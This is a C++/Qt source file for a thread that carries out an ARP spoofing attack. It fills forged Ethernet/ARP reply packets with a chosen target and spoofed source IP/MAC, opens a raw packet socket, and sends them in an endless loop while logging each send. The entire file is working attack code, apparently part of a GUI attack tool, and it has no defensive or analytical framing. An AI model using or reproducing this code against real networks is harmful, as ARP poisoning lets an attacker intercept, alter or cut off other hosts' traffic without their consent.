#include"thread_exe_attack.h"
#include"qdebug.h"
#include"arp_attack.h"

#include"data_all.h"

Thread_exe_attack::Thread_exe_attack(QObject* parent){

}

void Thread_exe_attack::recv_ip_mac(const vector<string> &ip_mac_temp){
    //ip_mac=ip_mac_temp;
    ip_mac.assign(ip_mac_temp.begin(),ip_mac_temp.end());
}

void Thread_exe_attack::run(){
    QThread::sleep(2);
    ARP_attack::init();
    //qDebug()<<"sub thread exe_attack";
    QDateTime current_date_time = QDateTime::currentDateTime();
    QString current_date = current_date_time.toString("yyyy-MM-dd hh:mm::ss.zzz");
    cout<<"sub thread exe_attack: "<<current_date.toStdString()<<endl;
    cout<< "sub thread ID:" << QThread::currentThreadId()<<endl;

    ARP_attack::log+="\n The "+to_string(ARP_attack::attack_times)+" times ARP Attacking is preparing now......"+"\n"+"Basic functions are being configured"+"\n";
    ARP_attack::infinite_loop = 1;

    enum RETURN_CODES {
        RETURN_OK,
        ERROR_CONNECT_SIGNAL,
        ERROR_CLI_ARGUMENTS,
        ERROR_PROCESS_INTERFACE,
        ERROR_PROCESS_ADDRESS,
        ERROR_OPEN_SOCKET,
    };

    int socket_fd;
    int parsed_option;
    struct ether_addr dest_mac;
    struct ether_addr source_mac;
    struct in_addr dest_ip;
    struct in_addr source_ip;
    int interface;
    struct sockaddr_ll dest_addr;
    char* interface_str=(char*)malloc(100*sizeof(char));
    char* dest_ip_str=(char*)malloc(100*sizeof(char));
    char* dest_mac_str=(char*)malloc(100*sizeof(char));
    char* source_ip_str=(char*)malloc(100*sizeof(char));
    char* source_mac_str=(char*)malloc(100*sizeof(char));
    int n_packets = 1;

    int time_step = DEFAULT_TIME_STEP;
    int should_exit = 0;

    strcpy(interface_str,ip_mac.at(0).c_str());
    strcpy(dest_ip_str,ip_mac.at(1).c_str());
    strcpy(dest_mac_str,ip_mac.at(2).c_str());
    strcpy(source_ip_str,ip_mac.at(3).c_str());
    strcpy(source_mac_str,ip_mac.at(4).c_str());

    bool sign=true;
    if(strlen(interface_str) == 0||strlen(dest_mac_str) == 0||strlen(dest_ip_str) == 0||strlen(source_mac_str) == 0||strlen(source_ip_str) == 0){
        //QMessageBox::warning(this,tr("Warning message"),tr("It is detected that part of the data is not complete, please fill in again!"));
        ARP_attack::log+="ARP Attack abort: \n because of the information loss...\n";
        ARP_attack::log+="\n The "+to_string(ARP_attack::attack_times)+" times ARP Attacking failed!\n";
        sign=false;
    }

    if(interface_str == NULL){
        fprintf(stderr, "Error: interface must be specified (--interface/-i <if>)\n");
        ARP_attack::log+="Error: interface must be specified (--interface/-i <if>)\n";
        should_exit = 1;
    }
    if(dest_mac_str == NULL){
        fprintf(stderr, "Error: destination MAC must be specified (--dest_mac/-D <mac>)\n");
        ARP_attack::log+="Error: destination MAC must be specified (--dest_mac/-D <mac>)\n";
        should_exit = 1;
    }
    if(dest_ip_str == NULL){
        fprintf(stderr, "Error: destination IPv4 must be specified (--dest_ip/-d <ip>)\n");
        ARP_attack::log+="Error: destination IPv4 must be specified (--dest_ip/-d <ip>)\n";
        should_exit = 1;
    }
    if(source_mac_str == NULL){
        fprintf(stderr, "Error: source MAC must be specified (--source_mac/-S <mac>)\n");
        ARP_attack::log+="Error: source MAC must be specified (--source_mac/-S <mac>)\n";
        should_exit = 1;
    }
    if(source_ip_str == NULL){
        fprintf(stderr, "Error: source IPv4 must be specified (--source_ip/-s <ip>)\n");
        ARP_attack::log+="Error: source IPv4 must be specified (--source_ip/-s <ip>)\n";
        should_exit = 1;
    }
    if(should_exit){
        //QMessageBox::warning(this,tr("Warning message"),tr("It is detected that part of the data is not complete, please fill in again!"));
        //exit(ERROR_CLI_ARGUMENTS);
    }

    if((interface = if_nametoindex(interface_str)) == 0){
        perror("Error: could not detect the interface");
        ARP_attack::log+="Error: could not detect the interface\n";
        //exit(ERROR_PROCESS_INTERFACE);
    }
    if((ether_aton_r(dest_mac_str, &dest_mac)) == NULL){
        fprintf(stderr, "Error: could not process MAC %s\n", dest_mac_str);
        string dest_mac_string=dest_mac_str;
        ARP_attack::log+="Error: could not process MAC "+dest_mac_string+" \n";
        //exit(ERROR_PROCESS_ADDRESS);
    }
    if((ether_aton_r(source_mac_str, &source_mac)) == NULL){
        fprintf(stderr, "Error: could not process MAC %s\n", source_mac_str);
        string source_mac_string=source_mac_str;
        ARP_attack::log+="Error: could not process MAC "+source_mac_string+"\n";
        //exit(ERROR_PROCESS_ADDRESS);
    }
    if((inet_aton(dest_ip_str, &dest_ip)) == 0){
        fprintf(stderr, "Error: could not process IPv4 %s\n", dest_ip_str);
        string dest_ip_string=dest_ip_str;
        ARP_attack::log+="Error: could not process IPv4"+dest_ip_string+" \n";
        //exit(ERROR_PROCESS_ADDRESS);
    }
    if((inet_aton(source_ip_str, &source_ip)) == 0){
        fprintf(stderr, "Error: could not process IPv4 %s\n", source_ip_str);
        string source_ip_string=source_ip_str;
        ARP_attack::log+="Error: could not process IPv4"+source_ip_string+"\n";
        //exit(ERROR_PROCESS_ADDRESS);
    }
    if(!ARP_attack::infinite_loop){
        if(n_packets <= 0)
            n_packets = 1;
    }

    if(sign){
        /* ============================================================================
                            C R E A T E   P A C K E T   B U F F E R
           ============================================================================ */
        uint8_t buffer[sizeof(struct ether_header) + sizeof(struct ether_arp)];
        struct ether_header* ether = (struct ether_header*)buffer;
        struct ether_arp* arp = (struct ether_arp*)(buffer + sizeof(struct ether_header));

        /* ============================================================================
                             S E T   E T H E R N E T   H E A D E R
           ============================================================================ */
        memcpy(&(ether->ether_dhost), &dest_mac, sizeof(ether->ether_dhost));
        memcpy(&(ether->ether_shost), &source_mac, sizeof(ether->ether_shost));
        ether->ether_type = htons(ETH_P_ARP);

        /* ============================================================================
                    S E T   A R P   O V E R   E T H E R N E T   H E A D E R
           ============================================================================ */
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = ETH_ALEN;
        arp->arp_pln = sizeof(struct in_addr);
        arp->arp_op = htons(ARPOP_REPLY);
        memcpy(&(arp->arp_sha), &source_mac, sizeof(arp->arp_sha));
        memcpy(&(arp->arp_spa), &source_ip, sizeof(arp->arp_spa));
        memcpy(&(arp->arp_tha), &dest_mac, sizeof(arp->arp_tha));
        memcpy(&(arp->arp_tpa), &dest_ip, sizeof(arp->arp_tpa));

        /* ============================================================================
                        F I L L   T A R G E T   S O C K E T   A D D R E S S
           ============================================================================ */
        memset(&dest_addr, 0x0, sizeof(struct sockaddr_ll));
        dest_addr.sll_family = AF_PACKET;
        dest_addr.sll_ifindex = interface;
        dest_addr.sll_halen = ETH_ALEN;
        dest_addr.sll_protocol = htons(ETH_P_ARP);
        memcpy(&(dest_addr.sll_addr), &dest_mac, sizeof(dest_addr.sll_addr));

        /* ============================================================================
                                O P E N   R A W   S O C K E T
           ============================================================================ */
        if((socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0){
            perror("Error: could not open socket");
            ARP_attack::log+="Error: could not open socket\n";
            ARP_attack::log+="\n The "+to_string(ARP_attack::attack_times)+" times ARP Attacking failed!\n";
            exit(ERROR_OPEN_SOCKET);
        }

        /* ============================================================================
                                     S E N D   L O O P
           ============================================================================ */
        while(n_packets--){
            if(sendto(socket_fd, &buffer, sizeof(buffer), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr))){
                printf("Sending to %s [%s]: %s is at %s\n", dest_ip_str, dest_mac_str, source_ip_str, source_mac_str);
                string dest_ip_string=dest_ip_str;
                string dest_mac_string=dest_mac_str;
                string source_ip_string=source_ip_str;
                string source_mac_string=source_mac_str;
                ARP_attack::log+="Sending ARP packet to "+dest_ip_string+" ["+dest_mac_string+"]: "+source_ip_string+" ["+source_mac_string+"]\n";

                vector<std::string> data;
                data.push_back(STATE_SEND);
                data.push_back(source_ip_string);
                data.push_back(source_mac_string);
                data.push_back(dest_ip_string);
                data.push_back(dest_mac_string);
                data.push_back(PROTOCOL_ARP);
                Data* temp=new Data(data);
                Data::datas.push_back(temp);
            }


            if(ARP_attack::infinite_loop)
                ++n_packets;

            sleep(time_step);
        }
        ARP_attack::attack_times++;

        ARP_attack::get_arp_dump(buffer,sizeof(struct ether_header) + sizeof(struct ether_arp));
    }
}

Thread_exe_attack::~Thread_exe_attack(){
    quit();
}
